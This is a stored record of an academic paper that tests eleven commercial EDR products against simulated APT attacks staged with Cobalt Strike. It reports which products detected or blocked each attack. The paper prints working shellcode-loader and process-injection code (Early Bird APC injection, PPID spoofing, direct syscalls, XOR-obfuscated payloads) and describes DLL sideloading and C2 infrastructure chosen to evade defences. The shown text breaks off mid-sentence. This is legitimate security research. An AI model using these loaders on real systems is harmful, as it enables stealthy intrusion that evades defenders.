{
    "id": "acb702f6-8809-4c11-899d-6d45522d15ce",
    "created_at": "2023-01-12T15:09:35.297875Z",
    "updated_at": "2025-03-27T02:16:25.943924Z",
    "deleted_at": null,
    "sha1_hash": "293de6dba6632200ae261d4aea4f88762ec0d9d5",
    "title": "An Empirical Assessment of Endpoint Security Systems Against Advanced Persistent Threats Attack Vectors",
    "authors": "",
    "file_creation_date": "2021-08-23T07:48:30Z",
    "file_modification_date": "2021-08-23T07:48:30Z",
    "file_size": 8559686,
    "plain_text": "# An Empirical Assessment of Endpoint Security Systems Against Advanced Persistent Threats Attack Vectors\n\n### George Karantzas[1] and Constantinos Patsakis[1,2]\n\n1Department of Informatics, University of Piraeus, Greece\n2Information Management Systems Institute of Athena Research Center, Greece\n\n**Abstract**\n\nAdvanced persistent threats pose a significant challenge for blue teams as they apply various\nattacks over prolonged periods, impeding event correlation and their detection. In this work, we\nleverage various diverse attack scenarios to assess the efficacy of EDRs and other endpoint security\nsolutions against detecting and preventing APTs. Our results indicate that there is still a lot of\nroom for improvement as state of the art endpoint security systems fail to prevent and log the bulk\nof the attacks that are reported in this work. Additionally, we discuss methods to tamper with the\ntelemetry providers of EDRs, allowing an adversary to perform a more stealth attack.\n**_Index terms— Advanced Persistent Threats; EDR; Malware; Evasion; Endpoint security_**\n\n## 1 Introduction\n\nCyber attacks are constantly evolving in both sophistication and scale, reaching such an extent that\nthe World Economic Forum considers it the second most threatening risk for global commerce over\nthe next decade [9]. The underground economy that has been created has become so huge to the point\nof being comparable to the size of national economies. Contrary to most cyberattacks which have a\n‘hit-and-run’ modus operandi, we have advanced persistent threats, most widely known through the\nabbreviation APT. In most cyber attacks, the threat actor would try to exploit a single exploit or\nmechanism to compromise as many hosts as possible and try to immediately monetise the abuse of\nthe stored information and resources as soon as possible. However, in APT attacks, the threat actor\nopts to keep a low profile, exploiting more complex intrusion methods through various attack vectors\nand prolong the control of the compromised hosts. Indeed, this control may span several years, as\nnumerous such incidents have shown.\nDue to their nature and impact, these attacks have received a lot of research focus as the heterogeneity of the attack vectors introduces many issues for traditional security mechanisms. For\ninstance, due to their stealth character, APTs bypass antiviruses and therefore, more advanced\nmethods are needed to timely detect them. The goal of an Endpoint Protection Platform (EPP)\nis prevent and mitigate endpoint security threats such as malware. Going a step further, Endpoint\nDetection and Response (EDR) systems provide a more holistic approach to the security of an organisation as beyond signatures, EDRs correlate information and events across multiple hosts of\nan organisation. Therefore, individual events from endpoints that could fall below the radar are\ncollected, processed, and correlated, providing blue teams with a deep insight into the threats that\nan organisation’s perimeter is exposed to.\nDespite the research efforts and the advanced security mechanisms deployed through EPPs and\nEDRs, recent events illustrate that we are far from being considered safe from such attacks. Since\nAPT attacks are not that often and not all details can be publicly shared, we argue that a sanity check\nto assess the preparedness of such security mechanisms against such attacks is deemed necessary.\nTherefore, we decided to conduct an APT group simulation to test the enterprise defences’ capabilities\nand especially EDRs, covering also some EPPs. To this end, we opted to simulate an APT attack in\na controlled environment using a set of scripted attacks which match the typical modus operandi of\nthese attacks. Thus, we try to infiltrate an organisation using spear-phishing and malware delivery\ntechniques and then examine the IOCs and responses produced by the EDRs. We have created four\nsuch use case scenarios which are rather indicative and diverse enough to illustrate the weak points\nof several perimeter security mechanisms, focusing more on EDRs.\nBased on the above, the contribution of our work is dual. First, we illustrate that despite the\nadvances in static and dynamic analysis, as well as multiple log collection mechanisms that are\n\n\n-----\n\napplied by state of the art EDRs, there are multiple ways that a threat actor may launch a successful\nattack without raising suspicions. As it will be discussed, while some of the EDRs may log fragments\nof the attacks, this does not imply that these logs will trigger an alert. Moreover, even if an alert is\ntriggered, one has to consider it from the security operations center (SOC) perspective. Practically,\na SOC receives multiple alerts and each one with different severity. These alerts are prioritised and\ninvestigated according to this severity. Therefore, low severity alerts may slip below the radar and\nnot be investigated, especially once the amount of alerts in a SOC is high [18]. Furthermore, we\ndiscuss how telemetry providers of EDRs can be tampered with, allowing an adversary to hide her\nattack and trails. To the best of our knowledge, there is no empirical assessment of the efficacy of\nreal-world EDRs and EPPs in scientific literature, nor conducted in a systematic way to highlight\ntheir underlying issues in a unified way. Beyond scientific literature, We consider that the closest\nwork is MITRE Engenuity[1]; however, our work provides the technical details for each step, from\nthe attacker’s perspective. Moreover, we differ from the typical APT capabilities that are reported\nfor each known group using and modifying off the shelf tools. Therefore, this work is the first one\nconducting such an assessment. By no means should this work serve as a guidance on security\ninvestment on any specific EDR solution. As it will be discussed later on, the outcomes of this\nwork try to point out specific representative attack vectors and cannot grasp the overall picture of\nall possible attacks that EDRs can mitigate. Indeed, customisation of EDRs rules may significantly\nchange their efficacy, nevertheless, the latter depends on the experience of the blue teams handling\nthese systems.\nThe rest of this work is organised as follows. In the following section, we provide an overview of\nthe related work regarding EDRs and APT attacks. Then, we present our experimental setup and\ndetail the technical aspects of our four attack vectors. In Section 4, we evaluate eleven state of the\nart EDRs and assess their efficacy in detecting and reporting our four attacks. Next, in Section 5\nwe present tampering attacks on telemetry providers of EDRs and their impact. Finally, the article\nconcludes providing summarising our contributions and discussing ideas for future work.\n\n## 2 Related work\n\n### 2.1 Endpoint detection and response systems\n\nThe term endpoint detection and response (EDR), also known as endpoint threat detection and\nresponse (ETDR), is coined by A. Chuvakin [7] back in 2013. As the name implies, this is an endpoint\nsecurity mechanism that does not cover the networking. EDRs collect data from endpoints and send\nthem for storage and processing in a centralised database. There, the collected events, binaries\netc., will be correlated in real-time to detect and analyse suspicious activities on the monitored\nhosts. Thus, EDRs boost the capabilities of SOCs as they discover and alert both the user and the\nemergency response teams of emerging cyber threats.\nEDRs are heavily rule-based; nevertheless, machine learning or AI methods have gradually found\ntheir way into these systems to facilitate finding new patterns and correlations. An EDR extends\nantivirus capabilities as an EDR will trigger an alert once it detects anomalous behaviour. Therefore,\nan EDR may detect unknown threats and prevent them before they become harmful due to the\nbehaviour and not just merely the signatures. While behavioural patterns may sound ideal for\ndetecting malicious acts, this also implies many false positives; that is, benign user actions considered\nmalicious, as EDRs prioritise precision over recall. Therefore, SOCs have to deal with sheer amounts\nof noise as many of the received alerts are false[5]. This is the reason why Hassan et al. recently\nintroduced Tactical Provenance Graphs (TPG) [12]. They reason about the causal dependencies\nbetween the threat alerts of an EDR and improve the visualisation of multistage attacks. Moreover,\ntheir system, RapSheet, has a different scoring system that significantly reduces the false positive\nrate. Finally, an EDR can perform remediation or removal tasks for specific threats.\nDespite the significant boost in security that EDRs bring, the overall security of the organisation\nhighly depends on the human factor. In the case of the blue teams, the results against an attack\nare expected to greatly vary between fully trained teams in Incident Response and teams that solely\nrespond to specific detected threats and are dependent on the output of a single security tool.\nHowever, both teams are expected to be triggered by and later investigate the telemetry from EDRs.\nSince the experience and the capacity of the blue team depends on multiple factors which are beyond\nthe scope of our work, in this study we focus on the telemetry of the EDRs, the significance that\nthey label events, and whether they blocked some actions.\nNevertheless, we highlight that not all EDRs allow the same amount of customisation nor implementation of the same policies. Moreover, blue teams cannot have the experience in all EDRs to\nconfigure them appropriately as each team will specialise in a limited set of solutions due to familiar\n1https://mitre-engenuity.org/\n\n\n-----\n\nity with a platform, marketing or even customer policies. Moreover, not all blue teams face the same\nthreats which may significantly bias the prioritisation of rules that blue teams would include in an\ninstallation, let alone the client needs. The above constitute diverse factors that cannot be studied\nin the context of this work. On the contrary, we should expect that a baseline security when opting\nin for all possible security measures should be more or less the same across most EDRs. Moreover,\none would expect that even if the EDR failed to block an attack, it should have at least logged the\nactions so that one can later process it. However, our experiments show that often this is not the\ncase.\n\n### 2.2 Advanced persistent threats\n\nThe term advanced persistent threat (APT) is used to describe an attack in which the threat actor\nestablishes stealth, long-term persistence on a victim’s computing infrastructure. The usual goal is\nto exfiltrate data or to disrupt services when deemed necessary by the threat actor. These attacks\ndiffer from the typical ‘hit and run’ modus operandi as they may span from months up to years. The\nattacks are launched by high-skilled groups, which are either a nation state or state-sponsored.\nAs noted by Chen et al. [6], APT attacks consist of six phases: (1) reconnaissance and weaponization; (2) delivery; (3) initial intrusion; (4) command and control; (5) lateral movement; and (6) data\nexfiltration. Complimentary to this model, other works [11, 20] consider attack trees to represent\nAPTs as different paths may be used in parallel to get the foothold on the targeted resources. Thus,\ninformation flows are often used to detect APTs [3] along with anomaly detection, sandboxing, pattern matching, and graph analysis [1]. The latter implies that EDRs may serve as excellent means\nto counter APT attacks.\nIn many such attacks, threat actors use fileless malware [15], a particular type of malware that\ndoes not leave any malicious fingerprint on the filesystem of the victim as they operate in memory.\nThe core idea behind this is that the victim will be lured into opening a benign binary, e.g. using social\nengineering, and this binary will be used to execute a set of malicious tasks. In fact, there are plenty\nof binaries and scripts preinstalled in Windows or later downloaded by the OS and are either digitally\nsigned or whitelisted by the operating system and enable a set of exploitable functionalities to be\nperformed. Since they are digitally signed by Microsoft, User Account Control (UAC) allows them to\nperform a set of tasks without issuing any alert to the user. These binaries and scripts are commonly\nknown as Living Off The Land Binaries and Scripts (and also Libraries), or LOLBAS/LOLBINS [4].\n\n### 2.3 Cyber kill chain\n\nCyber kill chain is a model which allows security analysts to deconstruct a cyber attack, despite its\ncomplexity, into mutually nonexclusive phases [13]. The fact that each phase is isolated from the\nothers allows one to analyse each part of the attack individually and create mitigation methods and\ndetection rules that can facilitate defence mechanisms for the attack under question or similar ones.\nMoreover, blue teams have to address smaller problems, one at a time which is far more resource\nefficient than facing a big problem as a whole. In the cyber kill chain model we consider that a threat\nactor tries to infiltrate a computer network in a set of sequential, incremental, and progressive steps.\nThus, if any stage of the attack is prevented, then the attack will not be successful. Therefore, the\nsmall steps that we referred above are crucial in countering a cyber attack and the earlier phase one\nmanages to prevent an attack, the smaller impact it will have. While the model is rather flexible, it\nhas undergone some updates to fit more targeted use cases, e.g. Internal Cyber Kill Chain to address\nissues with internal malicious actors; such as a disgruntled or disloyal employee.\nMITRE’s ATT&CK [21]is a knowledge base and model which tries to describe the behavior of a\nthreat actor throughout the attack lifecycle from reconnaissance and exploitation, to persistence and\nimpact. To this end, ATT&CK provides a comprehensive way to categorize the tactics, techniques\nand procedures of an adversary, abstracting from the underlying operating system and infrastructure.\nBased on the above, using ATT&CK one can emulate threat scenarios[2] or assess the efficacy of\ndeployed defense mechanisms against common adversary techniques. More recently, Pols introduced\nthe Unified Kill Chain[3] which extends and combines Cyber Kill Chain and MITRE’s ATT&CK.\nThe Unified Kill Chain addresses issues that are not covered by Cyber Kill Chain and ATT&CK as,\namong others, it models adversaries’ behaviours beyond the organizational perimeter, users’ roles\netc.\n\n2https://attack.mitre.org/resources/adversary-emulation-plans/\n3https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf\n\n\n-----\n\n## 3 Experimental Setup\n\nIn this section, we detail the preparation for our series of experiments to the EDRs. Because our\ngoal is to produce accurate and reproducible results, we provide the necessary code where deemed\nnecessary. To this end, we specifically design and run experiments to answer the following research\nquestions:\n\n   - RQ1: Can state of the art EDRs detect common APT attack methods?\n\n   - RQ2: Which are the blind spots of state of the art EDRs?\n\n   - RQ3: What information is reported by EDRs and which is their significance?\n\n   - RQ4: How can one decrease the significance of reported events or even prevent the reporting?\n\nUsing ATT&CK is a knowledge base and model, one can model the behaviour of the threat actor\nthat we emulate as illustrated in Figure 1. Due to space limitations, we have opted to use a modified\nversion of the standard ATT&CK matrix and used a radial circular dendrogram.\n\n#### Figure 1: ATT&CK model of the emulated threat actor.\n\nIn this work, we perform an empirical assessment of the security of EDRs. The selected EDRs\nwere selected based on the latest Gartner’s 2021 report[4], as we included the vast majority of the\n\n4https://www.gartner.com/en/documents/4001307/magic-quadrant-for-endpoint-protection-platforms\n\n\n-----\n\nleading EDRs in the market. The latter implies that we cover a big and representative market share\nwhich in fact drives the evolution and innovation in the sector. In our experiments, we opted to use\nthe most commonly used C2 framework, Cobalt Strike[5]. It has been used in numerous operations\nby both threat actors and ‘red teams’ to infiltrate organisations [22].\nMoreover, we used a mature domain; an expired domain with proper categorisation that will\npoint to a VPS server hosting our Cobalt Strike team-server. This would cause less suspicion and\nhopefully bypass some restrictions as previous experience has shown with parked domains and expired\ndomains[6]. We issued a valid SSL certificate for our C2 communication from Let’s Encrypt [7] to encrypt\nour traffic. Figure 2 illustrates our domain and its categorisation.\n\n#### Figure 2: The domain pointing to our C2 Server (up) and its categorisation (down).\n\nCobalt Strike deploys agents named ‘beacons’ on the victim, allowing the attacker to perform\nmultiple tasks on the compromised host. In our experiments, we used the so-called malleable C2\n_profile_ [8] as it modifies the beacon’s fingerprint. This masks our network activity and our malware’s\nbehaviour, such as the staging process, see Listing 6 in Appendix. Please note that it has been\nslightly formatted for the sake of readability.\n\n### 3.1 Attack Vectors\n\nWe have structured four diverse yet real-world scenarios to perform our experiments, which simulate\nthe ones used by threat actors in the wild. We believe that an empirical assessment of EDRs should\nreflect common attack patterns in the wild. Since the most commonly used attack vector by APT\ngroups is emails, as part of social engineering or spear phishing, we opted to use malicious attached\nfiles which the target victim would be lured to execute them. Moreover, we should consider that\ndue to the high noise from false positives that EDRs report, it is imperative to consider the score\n\n5https://www.cobaltstrike.com/\n6https://blog.sucuri.net/2016/06/spam-via-expired-domains.html,https://unit42.paloaltonetworks.com/\n```\ndomain-parking/\n\n```\n7https://letsencrypt.org/\n8https://www.cobaltstrike.com/help-malleable-c2\n\n\n-----\n\nthat each event is attributed to. Therefore, in our work we try to minimise the reported score of our\nactions in the most detailed setting of EDRs. With this approach we guarantee that the attack will\npass below the radar.\nBased on the above, our hypothetical threat actor starts its attack with some spear-phishing\nemails that try to lure the target user into opening a file or follow a link that will be used to\ncompromise the victim’s host. To this end, we have crafted some emails with links to cloud providers\nthat lead to some custom malware. More precisely, the attack vectors are the following:\n\n       - A .cpl file: A DLL file which can be executed by double-clicking under the context of the\n```\n       rundll32 LOLBINS which can execute code maliciously under its context. The file has been\n\n```\ncrafted using CPLResourceRunner[9]. To this end, we use a shellcode storage technique using\nMemory-mapped files (MMF) [17] and then trigger it using delegates, see Listing 1.\n\n1 `mmf = MemoryMappedFile.CreateNew(\"__shellcode\", shellcode.Length,`\n_�→_ `MemoryMappedFileAccess.ReadWriteExecute);`\n\n2 `// Create a memory mapped view accessor with read/write/execute permissions..`\n\n3 `mmva = mmf.CreateViewAccessor(0, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);`\n\n4 `// Write the shellcode to the MMF..`\n\n5 `mmva.WriteArray(0, shellcode, 0, shellcode.Length);`\n\n6 `// Obtain a pointer to our MMF..`\n\n7 `var pointer = (byte*)0;`\n\n8 `mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);`\n\n9 `// Create a function delegate to the shellcode in our MMF..`\n\n10 `var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer),`\n\n_�→_ `typeof(GetPebDelegate));`\n\n11 `// Invoke the shellcode..`\n\n12 `return func();`\n\n#### Listing 1: Shellcode execution code from CPLResourceRunner.\n\n       - A legitimate Microsoft (MS) Teams installation that will load a malicious DLL. In this regard,\nDLL side-loading[10] will lead to a self-injection, thus, allowing us to ”live” under a signed binary.\nTo achieve this, we used the AQUARMOURY-Brownie[11].\n\n       - An unsigned PE executable file; from now on referred to as EXE, that will execute process\ninjection using the “Early Bird ” technique of AQUARMOURY into werfault.exe. For this, we\nspoofed the parent of explorer.exe using the PROC THREAD ATTRIBUTE MITIGATION POLICY flag\nto protect our malware from an unsigned by Microsoft DLL event that is commonly used by\nEDRs for processes monitoring.\n\n       - An HTA file. Once the user visits a harmless HTML page containing an IFrame, he will be\nredirected and prompted to run an HTML file infused with executable VBS code that will load\nthe .NET code provided in Listing 2 perform self-injection under the context of mshta.exe.\n\nIn what follows, we solely evaluate EDRs against our attacks. Undoubtedly, in an enterprise\nenvironment one would expect more security measures, e.g., a firewall, an antivirus, etc. However,\ndespite improving the overall security of an organisation, their output is considered beyond the scope\nof this work.\n\n### 3.2 Code Analysis\n\nIn the following paragraphs, we detail the technical aspects of each attack vector.\n\n#### 3.2.1 HTA\n\nWe used C# and the Gadget2JScript[12] tool to generate a serialized gadget that will be executed into\nmemory, see Listing 2. ETWpCreateEtwThread is used to execute the shellcode by avoiding common\nAPIs such as CreateThread(). Note that in the background, RtlCreateUserThread is used[13].\n\n9https://github.com/rvrsh3ll/CPLResourceRunner\n10https://attack.mitre.org/techniques/T1574/002/\n11https://github.com/slaeryan/AQUARMOURY\n12https://github.com/med0x2e/GadgetToJScript\n13https://twitter.com/therealwover/status/1258157929418625025\n\n\n-----\n\n1 `byte[] shellcode = { };`\n\n2 `//xored shellcode`\n\n3 `byte[] xored = new byte[] {REDACTED};`\n\n4 `string key = \"mysecretkeee\";`\n\n5 `shellcode = xor(xored, Encoding.ASCII.GetBytes(key));`\n\n6 `uint old = 0;`\n\n7 `// Gets current process handle`\n\n8 `IntPtr procHandle = Process.GetCurrentProcess().Handle;`\n\n9 `//Allocation and then change the page to RWX`\n\n10 `IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT |`\n_�→_ `MEM_RESERVE,`\n\n11 `PAGE_READWRITE);`\n\n12 `VirtualProtectEx(procHandle, allocMemAddress, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READWRITE, out old);`\n\n13 `//Write the shellcode`\n\n14 `UIntPtr bytesWritten;`\n\n15 `WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);`\n\n16 `EtwpCreateEtwThread(allocMemAddress, IntPtr.Zero);`\n\n#### Listing 2: Code to allocate space and execute shellcode via EtwpCreateEtwThread.\n\n 3.2.2 EXE File\n\nThe main idea behind this attack is a rather simplistic code injection using executing our shellcode\nusing the QueueUserAPC() API before the main method. It will launch a sacrificial process with\nPPID spoofing and inject to that. The file will employ direct system calls in assembly to avoid\nhooked functions. It should be noted that the Windows Error Reporting service (werfault) is an\nexcellent target for injection as a child werfault process may appear once a process crashes, meaning\nthe parent can be arbitrary. This significantly impedes parent-child relation investigation. Notably,\nonce used with the correct flags, it can avoid suspicions [19]. Find the relevant code in Listing 3.\n\n#### 3.2.3 DLL Sideloading\n\nIn this case, we used the Brownie - Koppeling projects to create an evil clone of a legitimate DLL\nfrom system32 and added it to the folder of MS Teams so that our encrypted shellcode will be\ntriggered under its process. Moreover, since MS Teams adds itself to the startup, this provides us\npersistence to the compromised host. Note that EDRs sometimes tend to overlook self-injections as\nthey consider that they do not alter different processes.\nIn Listing 5 we illustrate the shellcode execution method. It is a classic CreateThread() based on\nlocal injection that will launch the shellcode under a signed and benign binary process. Unfortunately,\nthe only problem, in this case, is that the DLL is not signed, which may trigger some defence\nmechanisms. In the provide code, one observe the usage of VirtualProtect(). This was made to\navoid direct RWX memory allocation. In Listing 4 we can see the usage of assembly syscalls.\nFinally, it should be noted that for the tests, the installation will be placed and executed in the\nDesktop folder manually. Figure 3 illustrates that MS Teams allows for DLL hijacking.\n\n## 4 EDR evaluation\n\nIn what follows paragraphs, we evaluate eleven state of the art EDRs against our attacks. To this\nend, we provide a brief overview of each EDR and its features. Then, we proceed reporting which\nfeatures were enabled and discuss how each of them performed in the attack scenario. EDRs are\nlisted in alphabetical order.\n\n### 4.1 BitDefender GravityZone Plus\n\nBitDefender GravityZone Plus is the company’s flagship including EDR, EPP, and SandBox capabilities. Its use of common telemetry providers is exemplary as far as the tests are concerned and\ntries to make the most out of them with a highly intelligent engine which correlates the information\nthat in turn leads to immediate blocking and remmediation as well as a robust console.\n\n\n-----\n\n1 `// Assign CIG/blockdlls attribute`\n\n2 `DWORD64 CIGPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;`\n\n3 `UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &CIGPolicy, 8, NULL, NULL);`\n\n4 `//Open handle to parent process`\n\n5 `HANDLE hParentProcess;`\n\n6 `NTSTATUS status = NtOpenProcess(&hParentProcess, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId);`\n\n7 `if (status != STATUS_SUCCESS) {`\n\n8 `printf(\"[-] NtOpenProcess error: %X\\n\", status);`\n\n9 `return FALSE;`\n\n10 `}`\n\n11 `// Assign PPID Spoof attribute`\n\n12 `UpdateProcThreadAttribute(sie.lpAttributeList, 0,`\n\n13 `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);`\n\n14 `// Injection Code`\n\n15 `// Get handle to process and primary thread`\n\n16 `HANDLE hProcess = pi.hProcess;`\n\n17 `HANDLE hThread = pi.hThread;`\n\n18 `// Suspend the primary thread`\n\n19 `SuspendThread(hThread);`\n\n20 `// Allocating a RW memory buffer for the payload in the target process`\n\n21 `LPVOID pAlloc = NULL;`\n\n22 `SIZE_T uSize = payloadLen; // Store the payload length in a local variable`\n\n23 `status = NtAllocateVirtualMemory(hProcess, &pAlloc, 0, &uSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);`\n\n24 `if (status != STATUS_SUCCESS) {`\n\n25 `return FALSE;`\n\n26 `}`\n\n27 `// Writing the payload to the created buffer`\n\n28 `status = NtWriteVirtualMemory(hProcess, pAlloc, payload, payloadLen, NULL);`\n\n29 `if (status != STATUS_SUCCESS) {`\n\n30 `return FALSE;`\n\n31 `}`\n\n32 `// Change page protections of created buffer to RX so that payload can be executed`\n\n33 `ULONG oldProtection;`\n\n34 `LPVOID lpBaseAddress = pAlloc;`\n\n35 `status = NtProtectVirtualMemory(hProcess, &lpBaseAddress, &uSize, PAGE_EXECUTE_READ, &oldProtection);`\n\n36 `if (status != STATUS_SUCCESS) {`\n\n37 `return FALSE;`\n\n38 `}`\n\n39 `// Assigning the APC to the primary thread`\n\n40 `status = NtQueueApcThread(hThread, (PIO_APC_ROUTINE)pAlloc, pAlloc, NULL, NULL);`\n\n41 `if (status != STATUS_SUCCESS) {`\n\n42 `return FALSE;`\n\n43 `}`\n\n44 `// Resume the thread`\n\n45 `DWORD ret = ResumeThread(pi.hThread);`\n\n46 `if (ret == 0XFFFFFFFF)`\n\n47 `return FALSE;`\n\n#### Listing 3: Execution of shellcode into a child process with CIG and spoofed PPID via the ”EarlyBird” technique using Nt* APIs.\n\n 4.1.1 CPL\n\nThis vector was blocked as a behavioural alert of cobalt strike, as illustrated in Figure 4.\n\n#### 4.1.2 HTA\n\nThis vector was instantly detected as malicious and was blocked, see Figure 5.\n\n#### 4.1.3 DLL\n\nThis vector was blocked but did not raise a major alert. However, its events were included in another\nattack vector detection as illustrated in Figure 4.\n\n#### 4.1.4 EXE\n\nThe product is very dependant on UM Hooks, in this case the content was not blocked nor raised\nany alert/event as it uses syscalls.\n\n\n-----\n\n1 `;Sample Syscalls`\n\n2 `; ---------------------------------------------------------------------`\n\n3 `; Windows 7 SP1 / Server 2008 R2 specific syscalls`\n\n4 `; ---------------------------------------------------------------------`\n\n5\n\n6 `NtWriteVirtualMemory7SP1 proc`\n\n7 `mov r10, rcx`\n\n8 `mov eax, 37h`\n\n9 `syscall`\n\n10 `ret`\n\n11 `NtWriteVirtualMemory7SP1 endp`\n\n12\n\n13 `NtProtectVirtualMemory7SP1 proc`\n\n14 `mov r10, rcx`\n\n15 `mov eax, 4Dh`\n\n16 `syscall`\n\n17 `ret`\n\n18 `NtProtectVirtualMemory7SP1 endp`\n\n#### Listing 4: Sample direct syscalls in Assembly\n\n1 `BOOL execute_shellcode(LPSTR payload, SIZE_T payloadLen) {`\n\n2 `// Init some important variables`\n\n3 `void* exec_mem;`\n\n4 `BOOL ret;`\n\n5 `HANDLE threadHandle;`\n\n6 `DWORD oldProtect = 0;`\n\n7 `// Allocate a RW memory buffer for payload`\n\n8 `exec_mem = VirtualAlloc(0, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);`\n\n9 `// Write payload to new buffer`\n\n10 `RtlMoveMemory(exec_mem, payload, payloadLen);`\n\n11 `// Make new buffer as RX so that payload can be executed`\n\n12 `ret = VirtualProtect(exec_mem, payloadLen, PAGE_EXECUTE_READ, &oldProtect);`\n\n13 `// Now, run the payload`\n\n14 `if (ret != 0) {`\n\n15 `threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);`\n\n16 `WaitForSingleObject(threadHandle, -1);`\n\n17 `}`\n\n18 `return TRUE;`\n\n19 `}`\n\n#### Listing 5: Local memory allocation and shellcode execution via CreateThread().\n\n### 4.2 Carbon Black\n\nCarbon Black is one of the leading EDR solutions. Its true power comes from its telemetry and its\nability to extensively monitor every action performed on a system, such as registry modifications,\nnetwork connections etc., and most importantly, provide a SOC friendly interface to triage the host.\nBased on the telemetry collected from the sensor, a comparison to several IoCs. The latter will\nbe aggregated into a score which depending on its value, will trigger an alert. Moreover, when\nconsidering EDRs, configuration plays a vital role. Therefore, in this case, we have a custom SOC\nfeed for detections based on IOCs that Carbon Black processes. Also, the feeds can be query-based,\nmeaning that alerts will be produced based on results yielded by searches based on the events that\nCarbon Black processes, including but not limited to, registry modifications, network connections,\nmodule loadings.\nThis EDR relies heavily on kernel callbacks and a lot of its functionalities reside in its network\nfiltering driver and its file system filtering driver. For several detections, user-mode hooks are also\nused. As an example, consider the detection of memory dumping (DUMP PROCESS MEMORY). As\nmentioned in Carbon Black’s documentation, userland API hooks are set to detect a process memory\n\n\n-----\n\n#### Figure 3: Using Process Explorer to find hijackable DLLs.\n\n Figure 4: BitDefender GravityZone Plus detecting and blocking the CPL and DLL attacks.\n\n\n-----\n\n#### Figure 5: BitDefender GravityZone Plus detecting and blocking the HTA attack.\n\ndump. Another example is the detection of script interpreters loaded into memory (HAS SCRIPT DLL).\nAs mentioned in the documentation, a driver routine is set to identify processes that load an inmemory script interpreter.\n\n#### 4.2.1 Enabled settings\n\nCarbon Black Response is different in terms of logic and use case. Its main purpose is to provide\ntelemetry and not to proactively act. Moreover, its scope is to assist during an investigation as it\ndoes not include blocking capabilities but is a SOC friendly software that gives in-depth visibility.\nIts power is closely related to the person behind the console as beyond triaging hosts, its detection\nrely on feeds that can be customized and produce alerts. In our case we used some default feeds such\nas ATT&CK feed and Carbon Black’s Community Feed as well as a custom corporate feed.\n\n#### 4.2.2 CPL\n\n Figure 6: All alerts produced in Carbon Black.\n\nAs illustrated in Figure 6, an alert was triggered due to the abnormal name, location and usage\nof Shell32.dll. Carbon Black is well aware of malicious .cpl files in this case, but it cannot clearly\nverify whether this activity is indeed malicious. Therefore, the event is reported with a low score.\nFigure 7 illustrates on the right side the IOCs that were triggered.\n\n#### 4.2.3 HTA\n\nThe .hta file was detected due to its parent process as a possible CVE and for a suspicious loaded\nmodule. Carbon Black is aware of both LOLBAS and LOLBINS and timely detected it.\n\n\n-----\n\n#### Figure 7: CPL’s IOCs produced by Carbon Black.\n\n Figure 8: Carbon Black findings for HTA.\n\n 4.2.4 EXE - DLL\n\nRegarding the other two attack vectors, no alerts were raised. Nevertheless, their activity was\nmonitored normally and produced telemetry that the host communicates, despite being able to\ncommunicate successfully to our domain. Finally, it should be noted that the PPID spoofing did not\nsucceed against Carbon Black.Results may be seen is Figure 9\n\n#### Figure 9: The findings of Carbon Black for the EXE and DLL attack vectors.\n\n\n-----\n\n### 4.3 Check Point Harmony\n\n#### 4.3.1 Enabled settings\n\nFor Check Point Harmony, we used an prevent mode where possible and enabled emulation/behavioural\n(antibot antiexploit), and did not turn on safesearch setting to prevent checks of hashes.\n\n#### 4.3.2 HTA-CPL\n\nFor the HTA attack vector, a medium alert was raised, but the attack was not blocked. see Figure\n10. In the case of the CPL, the attack was blocked, and an alert was raised in the console, see Figure\n11.\n\n#### Figure 10: Check Point Harmony issuing an alert for the HTA attack vector, but not blocking it.\n\n Figure 11: Check Point Harmony blocking the CPL attack and issuing an alert in the console.\n\n 4.3.3 EXE\n\nThe EXE attack vector was detected and blocked, see Figure 12.\n\n#### 4.3.4 DLL\n\nThe DLL attack vector was not blocked nor detected.\n\n\n-----\n\n#### Figure 12: Check Point Harmony alerts the user and blocks the EXE attack.\n\n### 4.4 Cisco Secure Endpoint (ex AMP)\n\nAMP is Cisco’s EDR which provides endpoints with prevention, detection, and response capabilities,\nas well as threat hunting. Moreover, it uses cloud-based analytics and machine learning to timely\ndetect threats.\n\n#### 4.4.1 Enabled settings\n\nIn this EDR we used the ”Standard Protection Policy” activating the ”Malicious Script Blocking”\nfeature.\n\n#### 4.4.2 CPL-HTA\n\nBoth attacks were blocked. In the case of the CPL file, the file was quarantined, while in HTA case,\nthe process was killed, see Figure 13.\n\n#### 4.4.3 DLL\n\nIn the case of the DLL attack vector we noticed that while the attack was blocked, see Figure 14,\nthe provided alert was for exploit blocking. Therefore, we opted to perform the same attack, but\nwith a different application. Indeed, the problem seemed to be the specific application, so once we\nused another app but the same technique, the attack was successful.\n\n\n-----\n\n#### Figure 13: CISCO AMP blocking the CPL and HTA attack vectors.\n\n Figure 14: CISCO AMP reporting the block of the DLL attack vector for MS Teams sideloading.\n\n 4.4.4 EXE\n\nThis attack vector was successful and raised no alert.\n\n### 4.5 Comodo OpenEDR\n\nOpenEDR is Comodo’s open source EDR solution. It’s open source nature allows for a lot of\ncustomisation and extensions. It can levarage the cloud to manage the console and uses Comodo’s\ncontainment technology to block threats.\n\n#### 4.5.1 Enabled settings\n\nFor OpenEDR we used the the preconfigured profile that claims to offer maximum security namely\n“Level 3 Security (Max)”\n\n#### 4.5.2 HTA-DLL\n\nBoth attack vectors were successful and raised no alert.\n\n#### 4.5.3 CPL-EXE\n\nBoth attacks were blocked by the EDR using Commodo’s containment technology. While the files\nwere sent to console, no alert was raised, see Figure 15.\n\n### 4.6 CrowdStrike Falcon\n\nCrowdStrike Falcon combines some of the most advanced behavioural detection features with a 